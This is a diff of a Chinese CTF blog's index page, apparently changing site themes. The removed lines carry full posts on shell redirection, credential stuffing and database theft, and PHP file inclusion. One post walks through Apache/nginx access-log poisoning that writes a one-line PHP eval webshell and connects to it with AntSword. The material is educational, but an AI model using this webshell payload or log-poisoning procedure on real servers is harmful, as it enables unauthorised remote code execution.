@@ -1,1533 +1,339 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<!-- Head tag -->
-<head>
-
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-
-    <!--Description-->
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>h3110w0r1d's Blog - we can be what we are willing to be</title><meta name="author" content="h3110w0r1d"><meta name="copyright" content="h3110w0r1d"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全">
+<meta property="og:type" content="website">
+<meta property="og:title" content="h3110w0r1d&#39;s Blog">
+<meta property="og:url" content="http://dezhoutorizhao.github.io/page/6/index.html">
+<meta property="og:site_name" content="h3110w0r1d&#39;s Blog">
+<meta property="og:description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg">
+<meta property="article:author" content="h3110w0r1d">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://dezhoutorizhao.github.io/page/6/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'h3110w0r1d\'s Blog',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-01-15 13:56:44'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
     
-        <meta name="description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全">
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
     
-
-    <!--Author-->
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
     
-        <meta name="author" content="h3110w0r1d">
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
-
-    <!--Open Graph Title-->
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-        <meta property="og:title" content="h3110w0r1d&#39;s Blog"/>
-    
-
-    <!--Open Graph Description-->
-    
-        <meta property="og:description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全" />
-    
-
-    <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="h3110w0r1d&#39;s Blog"/>
-
-    <!--Type page-->
-    
-        <meta property="og:type" content="website" />
-    
-
-    <!--Page Cover-->
-    
-
-    
-        <meta name="twitter:card" content="summary" />
-    
-    
-    
-
-    <!-- Title -->
-    
-    <title>page - h3110w0r1d&#39;s Blog</title>
-
-    <!-- Bootstrap Core CSS -->
-    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
-
-    <!-- Custom Fonts -->
-    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
-
-    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
-    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-    <!--[if lt IE 9]>
-        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-    <![endif]-->
-
-    <!-- Gallery -->
-    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
-
-    <!-- Custom CSS -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-
-    <!-- Google Analytics -->
-    
-
-
-<meta name="generator" content="Hexo 5.4.0"></head>
-
-
-<body>
-
-<div class="bg-gradient"></div>
-<div class="bg-pattern"></div>
-
-<!-- Menu -->
-<!--Menu Links and Overlay-->
-<div class="menu-bg">
-    <div class="menu-container">
-        <ul>
-            
-            <li class="menu-item">
-                <a href="/">
-                    Home
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/archives">
-                    Archives
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/about.html">
-                    About
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/tags">
-                    Tags
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/categories">
-                    Categories
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/contact.html">
-                    Contact
-                </a>
-            </li>
-            
-        </ul>
-    </div>
-</div>
-
-<!--Hamburger Icon-->
-<nav>
-    <a href="#menu"></a>
-</nav>
-
-<div class="container">
-
-    <!-- Main Content -->
-    <div class="row">
-    <div class="col-sm-12">
-
-        <!--Title and Logo-->
-        <header>
-    <div class="logo">
-        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
-        
-            <h1 id="main-title" class="title">h3110w0r1d's Blog</h1>
-        
-    </div>
-</header>
-
-        <section class="main">
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/%E9%BB%91%E6%B4%9E/">
-                黑洞>/dev/null和2>&1
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-07-29</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/%E9%BB%91%E6%B4%9E/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/CTF/">CTF</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="linux命令中的-gt-dev-null黑洞"><a href="#linux命令中的-gt-dev-null黑洞" class="headerlink" title="linux命令中的&gt;/dev/null黑洞"></a>linux命令中的&gt;/dev/null黑洞</h1><h2 id="Linux中的标准输入输出"><a href="#Linux中的标准输入输出" class="headerlink" title="Linux中的标准输入输出"></a>Linux中的标准输入输出</h2><pre class="line-numbers language-none"><code class="language-none">0是标准输入，一般是从键盘获得输入
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">106</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">70</div></a></div><hr class="custom-hr"/></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="h3110w0r1d's Blog"><span class="site-name">h3110w0r1d's Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">h3110w0r1d's Blog</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E9%BB%91%E6%B4%9E/" title="黑洞&gt;/dev/null和2&gt;&amp;1">黑洞&gt;/dev/null和2&gt;&amp;1</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-07-29T08:46:53.750Z" title="发表于 2022-07-29 16:46:53">2022-07-29</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">linux命令中的&gt;/dev/null黑洞Linux中的标准输入输出0是标准输入，一般是从键盘获得输入
 1是标准输出，一般是输出到屏幕上
 2是标准错误，有时候屏幕上可以看到，但是重定向的文件中看不到的就是它了
-&gt;是重定向符号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+&gt;是重定向符号
 
-<h2 id="gt-dev-null"><a href="#gt-dev-null" class="headerlink" title="&gt;/dev/null"></a>&gt;/dev/null</h2><ol>
-<li>&gt;/dev/null是一个特殊的设备文件，这个文件接收到任何数据都会被丢弃，俗称“黑洞”</li>
-<li>2&gt;/dev/null意思是把错误输出到黑洞，也就是说如果你的命令出错的话，错误报告直接就删除了，不会显示在屏幕上</li>
-</ol>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ol>
-<li>如果出现这种有很多报错的情况，可以使用2&gt;/dev/null这个选项将错误信息重定向到黑洞中，只留下正确的信息回显，这个时候我们就能快速而精确的找到我们需要的文件了<br><img src="https://img-blog.csdnimg.cn/2019102417185571.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZXN0Xw==,size_16,color_FFFFFF,t_70"></li>
-</ol>
-<h1 id="2-gt-amp-1"><a href="#2-gt-amp-1" class="headerlink" title="2&gt;&amp;1"></a>2&gt;&amp;1</h1><h2 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h2><ol>
-<li>将标准错误输出重定向到标准输出</li>
-<li>符号&gt;&amp;是一个整体，不可分开</li>
-</ol>
-<h2 id="2-gt-amp-1和2-gt-1的区别"><a href="#2-gt-amp-1和2-gt-1的区别" class="headerlink" title="2&gt;&amp;1和2&gt;1的区别"></a>2&gt;&amp;1和2&gt;1的区别</h2><ol>
-<li>符号&gt;&amp;是一个整体</li>
-<li>2&gt;1的写法实际上是将标准错误输出重定向到名为”1“的文件中去了，没有1这个文件,而不是1所代表的标准输出</li>
-<li>写成2&amp;&gt;1也是不可以的</li>
-</ol>
-<h2 id="为什么2-gt-amp-1要放在后面"><a href="#为什么2-gt-amp-1要放在后面" class="headerlink" title="为什么2&gt;&amp;1要放在后面"></a>为什么2&gt;&amp;1要放在后面</h2><ol>
-<li>可以将1和2都理解为一个指针<pre class="line-numbers language-none"><code class="language-none">本来1-----&gt;屏幕 （1指向屏幕）
-执行&gt;log后， 1-----&gt;log (1指向log)
-执行2&gt;&amp;1后， 2-----&gt;1 (2指向1，而1指向log,因此2也指向了log)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h1 id="gt-和-gt-gt-的区别"><a href="#gt-和-gt-gt-的区别" class="headerlink" title="&gt;和&gt;&gt;的区别"></a>&gt;和&gt;&gt;的区别</h1><ol>
-<li>&gt;是重定向文件，覆盖文件原有的内容</li>
-<li>&gt;&gt;是重定向文件时，以追加的方式写入文件</li>
-</ol>
+&gt;/dev/null
+&gt;/dev/null是一个特殊的设备文件，这个文件接收到任何数据都会被丢弃，俗称“黑洞”
+2&gt;/dev/null意思是把错误输出到黑洞，也就是说如果你的命令出错的话，错误报告直接就删除了，不会显示在屏幕上
 
-        </div>
-    
+实例
+如果出现这种有很多报错的情况，可以使用2&gt;/dev/null这个选项将错误信息重定向到黑洞中，只留下正确的信息回显，这个时候我们就能快速而精确的找到我们需要的文件了
 
-</div>
-            
-                
-<div class="post">
+2&gt;&amp;1含义
+将标准错误输出重定向到标准输出
+符号&gt;&amp;是一个整体，不可分开
 
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/%E6%92%9E%E5%BA%93%E6%8B%96%E5%BA%93%E5%92%8C%E6%B4%97%E5%BA%93/">
-                撞库、拖库、洗库
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-07-26</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/%E6%92%9E%E5%BA%93%E6%8B%96%E5%BA%93%E5%92%8C%E6%B4%97%E5%BA%93/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/CTF/">CTF</a>
-                </span>
-            
-        </div>
-    </div>
+2&gt;&amp;1和2&gt;1的区别
+符号&gt;&amp;是一个整体
+2&gt;1的写法实际上是将标准错误输出重定向到名为”1“的文件中去了，没有1这个文件,而不是1所代表的标准输出
+写成2&amp;&gt;1也是不可 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E6%92%9E%E5%BA%93%E6%8B%96%E5%BA%93%E5%92%8C%E6%B4%97%E5%BA%93/" title="撞库、拖库、洗库">撞库、拖库、洗库</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-07-26T05:10:46.709Z" title="发表于 2022-07-26 13:10:46">2022-07-26</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">撞库概念
+撞库是黑客通过收集互联网已经泄露的用户和密码信息，生成对应的字典表，尝试批量登录其它网站后，得到一系列可以登录的用户。
+很多用户在不同网站使用的是相同的账号密码，因此黑客可以通过获取用户在A网站的账户从而尝试登录B网站，这就可以理解为撞库攻击
 
-    
-        <div class="content">
-            <h1 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol>
-<li>撞库是黑客通过收集互联网已经泄露的用户和密码信息，生成对应的字典表，尝试批量登录其它网站后，得到一系列可以登录的用户。</li>
-<li>很多用户在不同网站使用的是相同的账号密码，因此黑客可以通过获取用户在A网站的账户从而尝试登录B网站，这就可以理解为撞库攻击</li>
-</ol>
-<h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><ol>
-<li>撞库可采用大数据安全技术来防护，比如：用数据资产梳理发现敏感目录，使用数据库加密保护核心数据，使用数据库安全运维防运维人员撞库攻击等</li>
-</ol>
-<h1 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a>拖库</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><ol>
-<li>拖库是指黑客侵入有价值的网络站点，把注册用户的资料数据库全部盗走的行为，因为谐音，经常被称为脱裤</li>
-</ol>
-<h1 id="洗库"><a href="#洗库" class="headerlink" title="洗库"></a>洗库</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><ol>
-<li>在取得大量的用户数据之后，黑客会通过一系列的技术手段和黑色产业链将有价值的用户数据变现，这也通常被称作‘洗库’</li>
-<li>最后黑客将得到的数据在其它网站上尝试登录，叫做撞库，很多用户喜欢使用统一的用户名密码，‘撞库’也可以使黑客收获颇丰</li>
-</ol>
-<h2 id="撞库常见姿势"><a href="#撞库常见姿势" class="headerlink" title="撞库常见姿势"></a>撞库常见姿势</h2><ol>
-<li>使用ssh登录到服务器中<pre class="line-numbers language-none"><code class="language-none">ssh username@server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>查看能够使用root权限的用户列表<pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
+防护
+撞库可采用大数据安全技术来防护，比如：用数据资产梳理发现敏感目录，使用数据库加密保护核心数据，使用数据库安全运维防运维人员撞库攻击等
 
-        </div>
-    
+拖库概念
+拖库是指黑客侵入有价值的网络站点，把注册用户的资料数据库全部盗走的行为，因为谐音，经常被称为脱裤
 
-</div>
-            
-                
-<div class="post">
+洗库概念
+在取得大量的用户数据之后，黑客会通过一系列的技术手段和黑色产业链将有价值的用户数据变现，这也通常被称作‘洗库’
+最后黑客将得到的数据在其它网站上尝试登录，叫做撞库，很多用户喜欢使用统一的用户名密码，‘撞库’也可以使黑客收获颇丰
 
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6--%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%A9%E7%94%A8/">
-                文件包含漏洞进阶--日志文件包含利用
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-07-23</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6--%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%A9%E7%94%A8/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/CTF/">CTF</a>
-                </span>
-            
-        </div>
-    </div>
+撞库常见姿势
+使用ssh登录到服务器中ssh username@server
+查看能够使用root权限的用户列表sudo -l
 
-    
-        <div class="content">
-            <h1 id="文件包含漏洞进阶–日志文件包含利用"><a href="#文件包含漏洞进阶–日志文件包含利用" class="headerlink" title="文件包含漏洞进阶–日志文件包含利用"></a>文件包含漏洞进阶–日志文件包含利用</h1><h2 id="利用环境"><a href="#利用环境" class="headerlink" title="利用环境"></a>利用环境</h2><ol>
-<li>目标服务器存在文件包含漏洞的前提下</li>
-<li>没有上传功能下获取权限的方法</li>
-</ol>
-<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><ol>
-<li>当某个php文件存在本地文件包含漏洞，而却无法正常上传文件，这就意味着有包含漏洞却不能拿来利用，这时攻击者可能会利用<strong>apache日志文件</strong>来入侵</li>
-<li>apache服务器运行后会生成两个日志文件，分别是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且<strong>写到访问日志access.log文件中</strong></li>
-</ol>
-<h2 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h2><p>总：通过日志文件getshell</p>
-<ol>
-<li>通过burpsuit发送的请求包产生日志数据</li>
-<li>包含日志文件</li>
-<li>写入一句话木马getshell</li>
-<li>我的理解就是：添加一条日志文件数据，此日志文件中写木马，getshell</li>
-</ol>
-<h2 id="日志文件相关"><a href="#日志文件相关" class="headerlink" title="日志文件相关"></a>日志文件相关</h2><h3 id="日志文件路径"><a href="#日志文件路径" class="headerlink" title="日志文件路径"></a>日志文件路径</h3><ol>
-<li>nginx日志文件路径：?file=/var/log/nginx/access.log</li>
-<li>apache2日志文件路径:?file=/var/log/apache2/access.log</li>
-<li>这里主要看access.log这个日志，这个日志记录着服务器所有的访问记录，包括一些攻击流量<br><img src="https://img-blog.csdnimg.cn/img_convert/23c5f4f299615c69e592f7ece9907d94.png"></li>
-</ol>
-<h3 id="没有access-log的原因"><a href="#没有access-log的原因" class="headerlink" title="没有access.log的原因"></a>没有access.log的原因</h3><ol>
-<li>进入目录下，如果发现没有access.log这个访问文件，是因为apache配置文件没有打开这个配置选项，需要对相应的功能进行开启<img src="https://img-blog.csdnimg.cn/img_convert/b8c8454b0d069865745feb6bbd09d167.png">\</li>
-</ol>
-<h3 id="开启access-log"><a href="#开启access-log" class="headerlink" title="开启access.log"></a>开启access.log</h3><ol>
-<li>通过配置文件开启access.log访问日志功能<br><img src="https://img-blog.csdnimg.cn/img_convert/d49bb603d9ddf284be8f3292180d5b2c.png"></li>
-<li>搜索CustomLog “logs/access.log” common，将前面的##注释去掉，并保存文件，然后重启PHPstudy:</li>
-<li>访问几个网页，查看记录，对自己访问的页面有记录，说明access.log可以自动记录访问操作<br><img src="https://img-blog.csdnimg.cn/img_convert/645dae3d4466cd9df0b9917acbe526d7.png"></li>
-</ol>
-<h2 id="入侵过程"><a href="#入侵过程" class="headerlink" title="入侵过程"></a>入侵过程</h2><ol>
-<li>通过访问，让访问日志记录我们的phpinfo();代码，可以看出，访问日志已经成功记录了我们的访问内容,即可以在路径后面直接加/phpinfo();<pre class="line-numbers language-none"><code class="language-none">&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="https://img-blog.csdnimg.cn/img_convert/3442991cff249f5897ff13173b42e4d5.png"></li>
-<li>通过上图我们可以看出，日志已经成功记录我们的访问历史，但是是经过URL编码后的结果。如何让它记录我们原始完整的代码呢？一般URL编码是我们的浏览器进行完成的，它对我们访问的目录做了URL编码，然后发送到服务器，我们可以通过burpsuite，把经过浏览器URL编码后的数据进行修改。</li>
-<li>使用burp修改编码后的数据：即将burp中抓的包中URL编码的位置改为原本的字符<br><img src="https://img-blog.csdnimg.cn/img_convert/c2a0db8f67e1b0fe3c5bd409d407a440.png"><br><img src="https://img-blog.csdnimg.cn/img_convert/357a5a76f7eb0998aa444004b3d23fca.png"></li>
-<li>查看访问日志，可以看出没有编码的phpinfo();代码已经成功记录<br><img src="https://img-blog.csdnimg.cn/img_convert/514099aa5e2a00b27be2e2ebef9bda3c.png"></li>
-<li>文件包含只要文件中有Php代码，它就会调用include(),require()等函数将这个文件当作php脚本进行解析，这样我们就可以包含这个日志文件，让目标服务器把日志文件解析为php脚本</li>
-<li>让访问日志文件记录下写入文件脚本代码：（这个地方就包含了password，为了进行下一步连接蚁剑提供密码）<br>访问内容：<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-$file&#x3D;fopen(&#39;test1.php&#39;,&#39;w&#39;);
-fputs($file,&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;)
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li>对访问日志进行文件包含，并查看创建的一句话脚本，已经创建成功<img src="https://img-blog.csdnimg.cn/img_convert/80d9f87d67298bd7c9e8de1a00001a92.png">,解析方式：前面该是怎么样就是怎么样，解析不了直接跳过，一直到能够正常解析的位置就去解析</li>
-<li>连接蚁剑，密码就是上面请求并进行URL编码解码处理后的密码</li>
-</ol>
-<h2 id="nginx的access-log文件详解"><a href="#nginx的access-log文件详解" class="headerlink" title="nginx的access.log文件详解"></a>nginx的access.log文件详解</h2><h2 id="nginx系统中日志文件一般放在-var-log-nginx下"><a href="#nginx系统中日志文件一般放在-var-log-nginx下" class="headerlink" title="nginx系统中日志文件一般放在/var/log/nginx下"></a>nginx系统中日志文件一般放在/var/log/nginx下</h2><ol>
-<li>直接使用tail -f命令即可查看access日志</li>
-</ol>
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6--%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%A9%E7%94%A8/" title="文件包含漏洞进阶--日志文件包含利用">文件包含漏洞进阶--日志文件包含利用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-07-23T07:57:38.072Z" title="发表于 2022-07-23 15:57:38">2022-07-23</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">文件包含漏洞进阶–日志文件包含利用利用环境
+目标服务器存在文件包含漏洞的前提下
+没有上传功能下获取权限的方法
 
-        </div>
-    
+原理：
+当某个php文件存在本地文件包含漏洞，而却无法正常上传文件，这就意味着有包含漏洞却不能拿来利用，这时攻击者可能会利用apache日志文件来入侵
+apache服务器运行后会生成两个日志文件，分别是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志access.log文件中
 
-</div>
-            
-                
-<div class="post">
+利用方法：总：通过日志文件getshell
 
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-                文件包含漏洞
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-07-23</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/CTF/">CTF</a>
-                </span>
-            
-        </div>
-    </div>
+通过burpsuit发送的请求包产生日志数据
+包含日志文件
+写入一句话木马getshell
+我的理解就是：添加一条日志文件数据，此日志文件中写木马，getshell
 
-    
-        <div class="content">
-            <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞"><a href="#文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞" class="headerlink" title="文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞"></a>文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞</h2><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol>
-<li>php文件包含漏洞产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了意想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入，最常见的就是本地文件包含漏洞</li>
-<li>开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。</li>
-<li>程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</li>
-<li>在PHP web application中文件包含漏洞居多，jsp，asp等程序中很少，这就是语言设计的弊端</li>
-</ol>
-<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><ol>
-<li>本地文件包含漏洞：网站服务器本身存在恶意文件，然后利用本地文件包含使用</li>
-<li>远程文件包含漏洞：远程文件包含就是调用其它网站的恶意文件进行打开</li>
-</ol>
-<h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><ol>
-<li>php：include(),include_once(),fopen(),require(),require_once()</li>
-<li>jsp/servelt:ava.io,file(),java.io,filereader()</li>
-<li>asp:include file;virtual</li>
-</ol>
